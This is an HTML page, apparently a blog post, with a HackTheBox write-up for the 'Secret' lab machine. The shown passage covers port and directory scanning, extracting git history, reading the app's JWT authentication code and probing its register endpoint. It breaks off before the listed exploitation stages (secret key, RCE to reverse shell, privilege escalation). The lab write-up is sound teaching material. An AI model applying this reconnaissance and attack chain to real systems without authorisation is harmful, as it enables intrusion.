@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="It has been a long time since our last HackTheBox write-up, so today we will get into a two and a half months old machine - Secret.
+Enumeration Network scan As usual, nmap should provide us an elaborated report on the target&rsquo;s network.
+┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret] └─$ nmap -sV -sC 10.10.11.120 -v -oA ./nmap/Secret ┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret] └─$ cat ./nmap/Secret.nmap # Nmap 7.92 scan initiated Wed Jan 12 21:44:12 2022 as: nmap -sV -sC -v -oA .">  
+
+  <title>
+    
+      HackTheBox: Secret
+    
+  </title>
+
+  
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon/green.png" />
+
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.f3fa33b7405523e26c3513ae28d727c60efcaaa6c532b418812d08f71cb380419ee24a4e53a155d97b0879f61144b0476768c589c47485ffa080cbc5a4cd85f2.css" integrity="sha512-8/ozt0BVI&#43;JsNROuKNcnxg78qqbFMrQYgS0I9xyzgEGe4kpOU6FV2XsIefYRRLBHZ2jFicR0hf&#43;ggMvFpM2F8g==" />
+  
+
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/jquery_3.7.1.min.js"></script>
+  
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/typing_effect.min.js"></script>
+
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/img_relocs.min.js"></script>
+</head>
+<body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a style="color: #ff5;" href="/">[HOME]</a>
+
+<article>
+    <p class="post-meta">
+        
+        <time datetime="2022-01-13 09:30:00 &#43;1345 &#43;1345">
+            2022-01-13
+        </time>
+    </p>
+
+    <h1>HackTheBox: Secret</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#network-scan">Network scan</a></li>
+        <li><a href="#web-server">Web-server</a></li>
+        <li><a href="#source-code-analysis">Source code analysis</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#stage-1-commits-history-and-jwt-secret-key">Stage 1: Commits history and JWT secret key</a></li>
+        <li><a href="#stage-2-remote-code-execution-to-reverse-shell">Stage 2: Remote Code <em>Exec()ution</em> to reverse shell</a></li>
+        <li><a href="#stage-3-privilege-escalation">Stage 3: Privilege Escalation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <p>It has been a long time since our last HackTheBox write-up, so today we will get into a two and a half months old machine - Secret.</p>
+<h2 id="enumeration"><a class="h-anchor" href="#enumeration">Enumeration</a></h2>
+<h3 id="network-scan"><a class="h-anchor" href="#network-scan">Network scan</a></h3>
+<p>As usual, <code>nmap</code> should provide us an elaborated report on the target&rsquo;s network.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret]
+</span></span><span style="display:flex;"><span>└─$ nmap -sV -sC 10.10.11.120 -v -oA ./nmap/Secret
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret]
+</span></span><span style="display:flex;"><span>└─$ cat ./nmap/Secret.nmap         
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Nmap 7.92 scan initiated Wed Jan 12 21:44:12 2022 as: nmap -sV -sC -v -oA ./nmap/Secret 10.10.11.120</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#f00">for</span> 10.10.11.120
+</span></span><span style="display:flex;"><span>Host is up (0.026s latency).
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#f60">997</span> closed tcp ports (conn-refused)
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#f60">3072</span> 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
+</span></span><span style="display:flex;"><span>|   <span style="color:#f60">256</span> 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  <span style="color:#f60">256</span> 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: DUMB Docs
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>3000/tcp open  http    Node.js (Express middleware)
+</span></span><span style="display:flex;"><span>|_http-title: DUMB Docs
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Nmap done at Wed Jan 12 21:44:38 2022 -- 1 IP address (1 host up) scanned in 26.16 seconds</span>
+</span></span></code></pre></div><p>Based on the output from NMAP, the web-server and a NodeJS service is running on port <code>80</code> and <code>3000</code>, respectively. There is also a SSH listening on port <code>22</code>, however, it is not exploitable even in these easy-rated machines, at least from my own experience. So, let us pay our attention to the former two.</p>
+<h3 id="web-server"><a class="h-anchor" href="#web-server">Web-server</a></h3>
+<p>Visiting either <code>10.10.11.120:80</code> or <code>10.10.11.120:3000</code> does provide you with the same webpage.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/secret1.gif"></p>
+<p>You can see why this box is rated easy since it presumably enables us to download its source code in the last section. Beside that and the <strong>Live Demo</strong> feature, there are no other feasible or potential vectors around but some protracted documentation.</p>
+<p><strong>Live Demo</strong> redirects us to a assumed API endpoint running on the server.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-14_08-08.png"></p>
+<p>Normally, we would use auxiliaries to enumerate the endpoint, and <code>dirb</code>, <code>gobuster</code> are my favorites. There is, nevertheless, a trivial problem that when using <code>gobuster</code>, you will probably encounter the following error.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret]
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -q -u http://10.10.11.120/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,bak,txt,html -t <span style="color:#f60">50</span> -o gobuster.txt
+</span></span><span style="display:flex;"><span>Error: the server returns a status code that matches the provided options <span style="color:#f00">for</span> non existing urls. http://10.10.11.120/api/767c3163-5f9d-4235-b2ec-3c8766da50ab =&gt; <span style="color:#f60">200</span> (Length: 93). To <span style="color:#f00">continue</span> please exclude the status code, the length or use the --wildcard switch
+</span></span></code></pre></div><p>This happens due to the web-server is prone to be configurated to always response with <code>200 OK</code> code. You can verify this again by sending a <code>CURL</code> request to a non-existing page.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-14_08-50.png"></p>
+<p>On that account, we have to exclude <code>200 OK</code> responses and, hence, our command should look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret]
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -q -u http://10.10.11.120/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b <span style="color:#87ceeb">&#34;200&#34;</span> -x php,bak,txt,html -t <span style="color:#f60">50</span> -o gobuster.txt
+</span></span></code></pre></div><p>On the other side, <code>dirb</code> works like a charm.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret]
+</span></span><span style="display:flex;"><span>└─$ dirb http://10.10.11.120/api/ /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GENERATED WORDS: <span style="color:#f60">4612</span>                                                  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---- Scanning URL: http://10.10.11.120/api/ ----
+</span></span><span style="display:flex;"><span>+ http://10.10.11.120/api/logs (CODE:401|SIZE:13)                      
+</span></span><span style="display:flex;"><span>+ http://10.10.11.120/api/Logs (CODE:401|SIZE:13)                      
+</span></span><span style="display:flex;"><span>+ http://10.10.11.120/api/priv (CODE:401|SIZE:13)                      
+</span></span><span style="display:flex;"><span>                                                                       
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>END_TIME: Thu Jan <span style="color:#f60">13</span> 20:28:03 <span style="color:#f60">2022</span>
+</span></span><span style="display:flex;"><span>DOWNLOADED: <span style="color:#f60">4612</span> - FOUND: <span style="color:#f60">3</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>All these enumerated paths, however, are inaccessible without valid credentials as their responses are <code>401</code> with an <strong>Access Denied</strong> message. Despite being restricted, we are able to get the gist of what we should do next.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-15_10-41.png"></p>
+<h3 id="source-code-analysis"><a class="h-anchor" href="#source-code-analysis">Source code analysis</a></h3>
+<p>In this step, let us have a look at the open-source project provided which can be download at the bottom of the homepage.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret]
+</span></span><span style="display:flex;"><span>└─$ tree ./www/local-web -a -L <span style="color:#f60">2</span> | tee ./www/local-web/tree.txt 
+</span></span><span style="display:flex;"><span>./www/local-web
+</span></span><span style="display:flex;"><span>├── .env
+</span></span><span style="display:flex;"><span>├── .git
+</span></span><span style="display:flex;"><span>│   ├── branches
+</span></span><span style="display:flex;"><span>│   ├── COMMIT_EDITMSG
+</span></span><span style="display:flex;"><span>│   ├── config
+</span></span><span style="display:flex;"><span>│   ├── description
+</span></span><span style="display:flex;"><span>│   ├── HEAD
+</span></span><span style="display:flex;"><span>│   ├── hooks
+</span></span><span style="display:flex;"><span>│   ├── index
+</span></span><span style="display:flex;"><span>│   ├── info
+</span></span><span style="display:flex;"><span>│   ├── logs
+</span></span><span style="display:flex;"><span>│   ├── objects
+</span></span><span style="display:flex;"><span>│   └── refs
+</span></span><span style="display:flex;"><span>├── index.js
+</span></span><span style="display:flex;"><span>├── model
+</span></span><span style="display:flex;"><span>│   └── user.js
+</span></span><span style="display:flex;"><span>├── node_modules
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>├── package.json
+</span></span><span style="display:flex;"><span>├── package-lock.json
+</span></span><span style="display:flex;"><span>├── public
+</span></span><span style="display:flex;"><span>│   ├── assets
+</span></span><span style="display:flex;"><span>│   └── code
+</span></span><span style="display:flex;"><span>├── routes
+</span></span><span style="display:flex;"><span>│   ├── auth.js
+</span></span><span style="display:flex;"><span>│   ├── forgot.js
+</span></span><span style="display:flex;"><span>│   ├── private.js
+</span></span><span style="display:flex;"><span>│   └── verifytoken.js
+</span></span><span style="display:flex;"><span>├── src
+</span></span><span style="display:flex;"><span>│   ├── routes
+</span></span><span style="display:flex;"><span>│   └── views
+</span></span><span style="display:flex;"><span>├── tree.txt
+</span></span><span style="display:flex;"><span>└── validations.js
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f60">215</span> directories, <span style="color:#f60">17</span> files
+</span></span></code></pre></div><p>From the source tree, it is clearly a git repository as there is a <code>.git</code> directory and thus, we would like to dump all the content therein using <a href="https://github.com/internetwache/GitTools">GitTools</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret]
+</span></span><span style="display:flex;"><span>└─$ git clone --recursive https://github.com/internetwache/GitTools.git .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret]
+</span></span><span style="display:flex;"><span>└─$ ./GitTools/Extractor/extractor.sh 
+</span></span><span style="display:flex;"><span><span style="color:#0f0">###########</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Extractor is part of https://github.com/internetwache/GitTools</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Developed and maintained by @gehaxelt from @internetwache</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Use at your own risk. Usage might be illegal in certain circumstances. </span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Only for educational purposes!</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">###########</span>
+</span></span><span style="display:flex;"><span>[*] USAGE: extractor.sh GIT-DIR DEST-DIR
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret]
+</span></span><span style="display:flex;"><span>└─$ ./GitTools/Extractor/extractor.sh ./www/local-web/ ./www/extracted
+</span></span></code></pre></div><p>Since the tool need time to extract our target&rsquo;s repository, we can inspect other objects to save some time. And as you may or may not have noticed, neither back-end nor front-end is my favorite but fortunately, I can still read JS to some extent as I did some Node projects in the past. It is not necessary to go through every files and objects in the source code but to narrow it down, and in this case, we want to pay our attention to the <code>routes</code> directory.</p>
+<pre tabindex="0"><code>├── routes
+│   ├── auth.js
+│   ├── forgot.js
+│   ├── private.js
+│   └── verifytoken.js
+...
+</code></pre><p><code>auth.js</code>, <code>private.js</code> and <code>verifytoken.js</code>, these are undoubtedly sensitive files that often reveal a great variety of attack vectors, even in practical scenarios. In addition, it is also worth mentioning <code>index.js</code>, this lets us know how the server operates and utilizes its endpoints.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#0f0">// index.js
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#f00">const</span> express = require(<span style="color:#87ceeb">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> app = express();
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> mongoose = require(<span style="color:#87ceeb">&#39;mongoose&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> dotenv = require(<span style="color:#87ceeb">&#39;dotenv&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> privRoute = require(<span style="color:#87ceeb">&#39;./routes/private&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> bodyParser = require(<span style="color:#87ceeb">&#39;body-parser&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app.use(express.<span style="color:#f00">static</span>(<span style="color:#87ceeb">&#39;public&#39;</span>))
+</span></span><span style="display:flex;"><span>app.use(<span style="color:#87ceeb">&#39;/assets&#39;</span>, express.<span style="color:#f00">static</span>(__dirname + <span style="color:#87ceeb">&#39;public/assets&#39;</span>))
+</span></span><span style="display:flex;"><span>app.use(<span style="color:#87ceeb">&#39;/download&#39;</span>, express.<span style="color:#f00">static</span>(__dirname + <span style="color:#87ceeb">&#39;public/source&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app.set(<span style="color:#87ceeb">&#39;views&#39;</span>, <span style="color:#87ceeb">&#39;./src/views&#39;</span>)
+</span></span><span style="display:flex;"><span>app.set(<span style="color:#87ceeb">&#39;view engine&#39;</span>, <span style="color:#87ceeb">&#39;ejs&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">// import routs 
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#f00">const</span> authRoute = require(<span style="color:#87ceeb">&#39;./routes/auth&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> webroute = require(<span style="color:#87ceeb">&#39;./src/routes/web&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dotenv.config();
+</span></span><span style="display:flex;"><span><span style="color:#0f0">//connect db 
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>
+</span></span><span style="display:flex;"><span>mongoose.connect(process.env.DB_CONNECT, { useNewUrlParser: <span style="color:#f00">true</span> }, () =&gt;
+</span></span><span style="display:flex;"><span>    console.log(<span style="color:#87ceeb">&#34;connect to db!&#34;</span>)
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">//middle ware 
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>app.use(express.json());
+</span></span><span style="display:flex;"><span>app.use(<span style="color:#87ceeb">&#39;/api/user&#39;</span>,authRoute)
+</span></span><span style="display:flex;"><span>app.use(<span style="color:#87ceeb">&#39;/api/&#39;</span>, privRoute)
+</span></span><span style="display:flex;"><span>app.use(<span style="color:#87ceeb">&#39;/&#39;</span>, webroute)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app.listen(<span style="color:#f60">3000</span>, () =&gt; console.log(<span style="color:#87ceeb">&#34;server up and running&#34;</span>));
+</span></span></code></pre></div><p>Thanks to it, we can tell that <code>/api/user</code> is using <code>auth.js</code> and <code>/api/</code> is using <code>private.js</code> by looking at its imports, respectively.</p>
+<p>Inspecting <code>auth.js</code> divulges another valuable POST endpoint - <code>/api/user/register</code> as well as its validating condition which consists of <code>name</code>, <code>email</code> and <code>password</code>. Moreover, JWT (JSON Web Token) is also being used as a login authorization method; hence, we have to find a secret key which is being retrieved from <code>process.env.TOKEN_SECRET</code> or the <code>.env</code> file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f00">const</span> router = require(<span style="color:#87ceeb">&#39;express&#39;</span>).Router();
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> User = require(<span style="color:#87ceeb">&#39;../model/user&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> bcrypt = require(<span style="color:#87ceeb">&#39;bcryptjs&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> jwt = require(<span style="color:#87ceeb">&#39;jsonwebtoken&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> { registerValidation, loginValidation} = require(<span style="color:#87ceeb">&#39;../validations&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>router.post(<span style="color:#87ceeb">&#39;/register&#39;</span>, <span style="color:#f00">async</span> (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">// validation
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#f00">const</span> { error } = registerValidation(req.body)
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (error) <span style="color:#f00">return</span> res.status(<span style="color:#f60">400</span>).send(error.details[<span style="color:#f60">0</span>].message);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">// check if user exists
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#f00">const</span> emailExist = <span style="color:#f00">await</span> User.findOne({email:req.body.email})
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (emailExist) <span style="color:#f00">return</span> res.status(<span style="color:#f60">400</span>).send(<span style="color:#87ceeb">&#39;Email already Exist&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">// check if user name exist 
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#f00">const</span> unameexist = <span style="color:#f00">await</span> User.findOne({ name: req.body.name })
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (unameexist) <span style="color:#f00">return</span> res.status(<span style="color:#f60">400</span>).send(<span style="color:#87ceeb">&#39;Name already Exist&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">//hash the password
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#f00">const</span> salt = <span style="color:#f00">await</span> bcrypt.genSalt(<span style="color:#f60">10</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">const</span> hashPaswrod = <span style="color:#f00">await</span> bcrypt.hash(req.body.password, salt)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">//create a user 
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#f00">const</span> user = <span style="color:#f00">new</span> User({
+</span></span><span style="display:flex;"><span>        name: req.body.name,
+</span></span><span style="display:flex;"><span>        email: req.body.email,
+</span></span><span style="display:flex;"><span>        password:hashPaswrod
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">try</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">const</span> saveduser = <span style="color:#f00">await</span> user.save();
+</span></span><span style="display:flex;"><span>        res.send({ user: user.name})
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">catch</span>(err){
+</span></span><span style="display:flex;"><span>        console.log(err)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">// login 
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>
+</span></span><span style="display:flex;"><span>router.post(<span style="color:#87ceeb">&#39;/login&#39;</span>, <span style="color:#f00">async</span>  (req , res) =&gt; {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">const</span> { error } = loginValidation(req.body)
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (error) <span style="color:#f00">return</span> res.status(<span style="color:#f60">400</span>).send(error.details[<span style="color:#f60">0</span>].message);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">// check if email is okay 
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#f00">const</span> user = <span style="color:#f00">await</span> User.findOne({ email: req.body.email })
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (!user) <span style="color:#f00">return</span> res.status(<span style="color:#f60">400</span>).send(<span style="color:#87ceeb">&#39;Email is wrong&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">// check password 
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#f00">const</span> validPass = <span style="color:#f00">await</span> bcrypt.compare(req.body.password, user.password)
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (!validPass) <span style="color:#f00">return</span> res.status(<span style="color:#f60">400</span>).send(<span style="color:#87ceeb">&#39;Password is wrong&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">// create jwt 
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#f00">const</span> token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
+</span></span><span style="display:flex;"><span>    res.header(<span style="color:#87ceeb">&#39;auth-token&#39;</span>, token).send(token);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>router.use(<span style="color:#f00">function</span> (req, res, next) {
+</span></span><span style="display:flex;"><span>    res.json({
+</span></span><span style="display:flex;"><span>        message: {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            message: <span style="color:#87ceeb">&#34;404 page not found&#34;</span>,
+</span></span><span style="display:flex;"><span>            desc: <span style="color:#87ceeb">&#34;page you are looking for is not found. &#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>module.exports = router
+</span></span></code></pre></div><p>Henceforth, we do know how to register a new user, so let us try sending a POST request to <code>/api/user/register</code> and see whether it is a valid API or not.</p>
+<p>You can try either Burpsuite or cURL should work properly and return the same response.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#ff0">POST</span> /api/user/register <span style="color:#f00">HTTP</span>/<span style="color:#f60">1.1</span>
+</span></span><span style="display:flex;"><span>Host: 10.10.11.120
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: 1
+</span></span><span style="display:flex;"><span>If-None-Match: W/&#34;5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s&#34;
+</span></span><span style="display:flex;"><span>Content-Length: 28
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	&#34;name&#34;: <span style="color:#87ceeb">&#34;legiahuyy&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">// Response
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>HTTP/<span style="color:#f60">1.1</span> <span style="color:#f60">400</span> Bad Request
+</span></span><span style="display:flex;"><span>Server: nginx/<span style="color:#f60">1.18</span>.<span style="color:#f60">0</span> (Ubuntu)
+</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#f60">19</span> Jan <span style="color:#f60">2022</span> <span style="color:#f60">15</span>:<span style="color:#f60">09</span>:<span style="color:#f60">26</span> GMT
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset=utf<span style="color:#f60">-8</span>
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#f60">19</span>
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>X-Powered-By: Express
+</span></span><span style="display:flex;"><span>ETag: W/<span style="color:#87ceeb">&#34;13-Q2T0jisz/unr9MyMuXKKCS2zU1g&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#87ceeb">&#34;email&#34;</span> is required
+</span></span></code></pre></div><p>And cURL approach as follows:</p>
